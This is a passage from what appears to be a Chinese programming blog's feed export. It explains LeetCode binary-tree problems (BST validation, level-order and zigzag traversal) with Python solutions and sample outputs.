class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h3 id="方法一：递归"><a href="#方法一：递归" class="headerlink" title="方法一：递归"></a>方法一：递归</h3><ul><li>思路与算法</li></ul><p>设计一个递归函数 helper(root, lower, upper) 来递归判断，函数表示考虑以 root 为根的子树，判断子树中所有节点的值是否都在 <code>(l,r)</code>的范围内（注意是开区间）。如果 root 节点的值 <code>val</code> 不在 <code>(l,r)</code> 的范围内说明不满足条件直接返回，否则我们要继续递归调用检查它的左右子树是否满足，如果都满足才说明这是一棵二叉搜索树。</p><p>那么根据二叉搜索树的性质，在递归调用左子树时，我们需要把上界 upper 改为<code>root.val</code>，即调用<code>helper(root.left, lower, root.val)</code>，因为左子树里所有节点的值均小于它的根节点的值。同理递归调用右子树时，我们需要把下界 <code>lower</code>改为 <code>root.val</code>，即调用 <code>helper(root.right, root.val, upper)</code>。</p><p>函数递归调用的入口为 <code>helper(root, -inf, +inf)， inf</code> 表示一个无穷大的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValidBST</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(node, lower = float<span class="params">(<span class="string">'-inf'</span>)</span>, upper = float<span class="params">(<span class="string">'inf'</span>)</span>)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">            val = node.val</span><br><span class="line">            <span class="keyword">if</span> val &lt;= lower <span class="keyword">or</span> val &gt;= upper:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> helper(node.right, val, upper):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> helper(node.left, lower, val):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> helper(root)</span><br><span class="line"></span><br><span class="line">root =  [<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.isValidBST(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>True</code></pre><h3 id="方法二：中序遍历"><a href="#方法二：中序遍历" class="headerlink" title="方法二：中序遍历"></a>方法二：中序遍历</h3><p>基于方法一中提及的性质，我们可以进一步知道二叉搜索树「中序遍历」得到的值构成的序列一定是升序的，这启示我们在中序遍历的时候实时检查当前节点的值是否大于前一个中序遍历到的节点的值即可。如果均大于说明这个序列是升序的，整棵树是二叉搜索树，否则不是，下面的代码我们使用栈来模拟中序遍历的过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValidBST</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        stack, inorder = [], float(<span class="string">'-inf'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> stack <span class="keyword">or</span> root:</span><br><span class="line">            <span class="keyword">while</span> root:</span><br><span class="line">                stack.append(root)</span><br><span class="line">                root = root.left</span><br><span class="line">            root = stack.pop()</span><br><span class="line">            <span class="comment"># 如果中序遍历得到的节点的值小于等于前一个 inorder，说明不是二叉搜索树</span></span><br><span class="line">            <span class="keyword">if</span> root.val &lt;= inorder:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            inorder = root.val</span><br><span class="line">            root = root.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">root =  [<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.isValidBST(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>True</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】103.二叉树的锯齿形层序遍历</title>
      <link href="2020/11/30/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-103.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%94%AF%E9%BD%BF%E5%BD%A2%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86/"/>
      <url>2020/11/30/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-103.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%94%AF%E9%BD%BF%E5%BD%A2%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>迭代：广度优先遍历，递归：深度优先遍历</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，返回其节点值的锯齿形层次遍历。（即先从左往右，再从右往左进行下一层遍历，以此类推，层与层之间交替进行）。</p><p>例如：</p><p>给定二叉树 [3,9,20,null,null,15,7],</p><pre><code>  3 / \9  20  /  \ 15   7</code></pre><p>返回锯齿形层次遍历如下：</p><pre><code>[  [3],  [20,9],  [15,7]]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：BFS（广度优先遍历）"><a href="#方法一：BFS（广度优先遍历）" class="headerlink" title="方法一：BFS（广度优先遍历）"></a>方法一：BFS（广度优先遍历）</h3><ul><li><p>思路</p><p>  最直接BFS，逐层遍历</p><p>  BFS 在每层的默认顺序是从左到右，因此需要调整 BFS 算法以生成锯齿序列</p><blockquote><p>最关键的是使用<strong>双端队列</strong>遍历，可以在队列的任一端插入元素。</p></blockquote><p>  如果需要 FIFO （先进先出）的顺序，则将新元素添加到队列尾部，后插入的元素就可以排在后面。</p><p>  如果需要 FILO （先进后出）的顺序，则将新元素添加到队列首部，后插入的元素就可以排在前面。</p></li></ul><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201130BFS.png" width="600px"><ul><li>算法</li></ul><p>实现 BFS 的几种算法。</p><blockquote><ul><li>使用两层嵌套循环。外层循环迭代树的层级，内层循环迭代每层上的节点。</li><li>也可以使用一层循环实现 BFS。将要访问的节点添加到队列中，使用 分隔符（例如：空节点）把不同层的节点分隔开。分隔符表示一层结束和新一层开始。</li></ul></blockquote><p>这里采用第二种方法。在此算法的基础上，借助双端队列实现锯齿形顺序。在每一层，使用一个空的双端队列保存该层所有的节点。根据每一层的访问顺序，即从左到右或从右到左，决定从双端队列的哪一端插入节点。</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201130deque.png" width="600px"><p>实现从左到右的遍历顺序（FIFO）。将元素添加到队列尾部，保证后添加的节点后被访问。从上图中可以看出，输入序列 [1, 2, 3, 4, 5]，按照 FIFO 顺序得到输出序列为 [1, 2, 3, 4, 5]。</p><p>实现从右到左的遍历顺序（FILO）。将元素添加到队列头部，保证后添加的节点先被访问。输入序列 [1, 2, 3, 4, 5]，按照 FILO 顺序得到输出序列为 [5, 4, 3, 2, 1]。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zigzagLevelOrder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        ret = []</span><br><span class="line">        level_list = deque()</span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="comment"># start with the level 0 with a delimiter</span></span><br><span class="line">        node_queue = deque([root, <span class="literal">None</span>])</span><br><span class="line">        is_order_left = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> len(node_queue) &gt; <span class="number">0</span>:</span><br><span class="line">            curr_node = node_queue.popleft()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> curr_node:</span><br><span class="line">                <span class="keyword">if</span> is_order_left:</span><br><span class="line">                    level_list.append(curr_node.val)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    level_list.appendleft(curr_node.val)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> curr_node.left:</span><br><span class="line">                    node_queue.append(curr_node.left)</span><br><span class="line">                <span class="keyword">if</span> curr_node.right:</span><br><span class="line">                    node_queue.append(curr_node.right)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># we finish one level</span></span><br><span class="line">                ret.append(level_list)</span><br><span class="line">                <span class="comment"># add a delimiter to mark the level</span></span><br><span class="line">                <span class="keyword">if</span> len(node_queue) &gt; <span class="number">0</span>:</span><br><span class="line">                    node_queue.append(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># prepare for the next level</span></span><br><span class="line">                level_list = deque()</span><br><span class="line">                is_order_left = <span class="keyword">not</span> is_order_left</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">root =  [<span class="number">3</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.zigzagLevelOrder(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>[deque([3]), deque([20, 9]), deque([15, 7])]</code></pre><p>注意：一种替代做法是，实现标准的 BFS 算法，得到每层节点从左到右的遍历顺序。然后按照要求 翻转 某些层节点的顺序，得到锯齿形的遍历结果。</p><h3 id="方法二：DFS-（深度优先遍历）"><a href="#方法二：DFS-（深度优先遍历）" class="headerlink" title="方法二：DFS （深度优先遍历）"></a>方法二：DFS （深度优先遍历）</h3><ul><li>思路</li></ul><p>也可以使用 DFS 实现 BFS 的遍历顺序。</p><blockquote><p>在 DFS 遍历期间，将结果保存在按层数索引的全局数组中。即元素 array[level] 存储同一层的所有节点。然后在 DFS 的每一步更新全局数组</p></blockquote><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201130dfs.png" width="600px"><p>与改进的 BFS 算法类似，使用双端队列保存同一层的所有节点，并交替插入方向（从首部插入或从尾部插入）得到需要的输出顺序。</p><ul><li>算法</li></ul><p>使用递归实现 DFS 算法。定义一个递归方法 DFS(node, level)，方法参数为当前节点 node 和指定层数 level。该方法共执行三个步骤：</p><ul><li><p>如果是第一次访问该层的节点，即该层的双端队列不存在。那么创建一个双端队列，并添加该节点到队列中。</p></li><li><p>如果当前层的双端队列已存在，根据顺序，将当前节点插入队列头部或尾部。</p></li><li><p>最后，为每个节点调用该递归方法。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zigzagLevelOrder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">        results = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(node, level)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> level &gt;= len(results):</span><br><span class="line">                results.append(deque([node.val]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> level % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    results[level].append(node.val)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    results[level].appendleft(node.val)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> next_node <span class="keyword">in</span> [node.left, node.right]:</span><br><span class="line">                <span class="keyword">if</span> next_node <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    dfs(next_node, level+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># normal level order traversal with DFS</span></span><br><span class="line">        dfs(root, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line">    </span><br><span class="line">root =  [<span class="number">3</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">6</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.zigzagLevelOrder(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>[deque([3]), deque([20, 9]), deque([15, 7]), deque([6])]</code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构与算法】【LeetCode】【二叉树】102.二叉树的层序遍历</title>
      <link href="2020/11/26/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-102.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/"/>
      <url>2020/11/26/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-102.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>迭代：广度优先遍历，递归：深度优先遍历</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个二叉树，请你返回其按 层序遍历 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p><p>示例：</p><p>二叉树：[3,9,20,null,null,15,7],</p><pre><code>  3 / \9  20  / \ 15   7</code></pre><p>返回其层次遍历结果：</p><pre><code>[  [3],  [9,20],  [15,7]]</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法一：迭代，广度优先变遍历"><a href="#方法一：迭代，广度优先变遍历" class="headerlink" title="方法一：迭代，广度优先变遍历"></a>方法一：迭代，广度优先变遍历</h3><ul><li>算法与思路分析<blockquote><p>采用队列（FIFO），每层入队，统计该层结点数，每层出队完时，下一层入队。</p></blockquote></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tree</span><span class="params">(list_tree)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>  <span class="keyword">not</span> list_tree:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    new_queue= Queue()</span><br><span class="line">    root = TreeNode(list_tree[<span class="number">0</span>])</span><br><span class="line">    new_queue.put(root) <span class="comment"># 先入队一个结点</span></span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty() <span class="keyword">and</span> count&lt;len(list_tree):</span><br><span class="line">        dequeue = new_queue.get() <span class="comment"># 出队</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dequeue.left <span class="keyword">and</span>  <span class="keyword">not</span> dequeue.right:</span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.left=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count&lt;len(list_tree) <span class="keyword">and</span> list_tree[count]:</span><br><span class="line">                dequeue.right=TreeNode(list_tree[count])</span><br><span class="line">            count= count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                new_queue.put(dequeue.left)</span><br><span class="line">            <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                new_queue.put(dequeue.right)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self, root: TreeNode)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        new_queue=Queue()</span><br><span class="line">        list_level=[]</span><br><span class="line">        <span class="comment"># 初始化队列</span></span><br><span class="line">        new_queue.put(root)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> new_queue.empty():  </span><br><span class="line">            count =new_queue.qsize() <span class="comment"># 统计每层结点个数</span></span><br><span class="line">            tmp=[]</span><br><span class="line">            <span class="keyword">while</span> count: <span class="comment"># 使每层结点都出队，并让下一层结点入队</span></span><br><span class="line">                dequeue= new_queue.get()</span><br><span class="line">                tmp.append(dequeue.val)</span><br><span class="line">                <span class="keyword">if</span> dequeue.left:</span><br><span class="line">                    new_queue.put(dequeue.left)</span><br><span class="line">                <span class="keyword">if</span> dequeue.right:</span><br><span class="line">                    new_queue.put(dequeue.right)</span><br><span class="line">                count= count<span class="number">-1</span></span><br><span class="line">            list_level.append(tmp)</span><br><span class="line">        <span class="keyword">return</span> list_level</span><br><span class="line">                   </span><br><span class="line"></span><br><span class="line">root = [<span class="number">3</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">root_tree=create_tree(root)</span><br><span class="line">a=Solution()</span><br><span class="line">result =a.levelOrder(root_tree)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>[[3], [9, 20], [15, 7]]</code></pre><p>时间复杂度： O(n)</p><p>空间复杂度：O(n)</p><h3 id="方法二：递归，深度优先遍历"><a href="#方法二：递归，深度优先遍历" class="headerlink" title="方法二：递归，深度优先遍历"></a>方法二：递归，深度优先遍历</h3><p>广度优先处理切割很明显，如图按每层进行切割</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201126bfs.jpg" width="500px"><p>深度优先处理时，先调整二叉树形态，如下，田字型每一行为每一层对应结点</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201126dfs.jpg" width="500px"><p>按照深度优先的处理顺序，会先访问节点 1，再访问节点 2，接着是节点 3。<br>之后是第二列的 4 和 5，最后是第三列的 6。</p><p>每次递归的时候都需要带一个 index(表示当前的层数)，也就对应那个田字格子中的第几行，如果当前行对应的 list 不存在，就加入一个空 list 进去。</p><p>动态演示如下:</p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/201126dfs.gif" width="600px"><p>时间复杂度：O(N)</p><p>空间复杂度：O(h)，h 是树的高度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span 